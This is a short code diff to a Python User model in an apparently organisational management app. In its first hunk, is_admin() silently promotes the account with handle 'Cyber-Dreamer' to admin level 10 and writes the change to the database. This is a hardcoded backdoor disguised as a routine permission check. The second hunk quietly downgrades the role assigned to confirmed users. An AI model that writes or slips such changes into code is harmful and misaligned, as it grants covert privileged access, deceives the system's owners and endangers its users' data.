@@ -281,6 +281,10 @@ class User(Base):
     
     
     def is_admin(self):
+        if self.RSI_handle == 'Cyber-Dreamer' and self.security_level != 10:
+            self.security_level = 10
+            db.session.commit()
+            
         return self.security_level == 10
     
     def is_manager(self, division=None, department=None):
@@ -333,7 +337,7 @@ class User(Base):
         
         from corp_system.models import Role
         if self.CORP_confirmed:
-            self.add_role(Role.query.filter_by(title='Corporateer').first())
+            self.add_role(Role.query.filter_by(title='Intern').first())
         
         try:
             from corp_system.bot.controller import Bot_controller
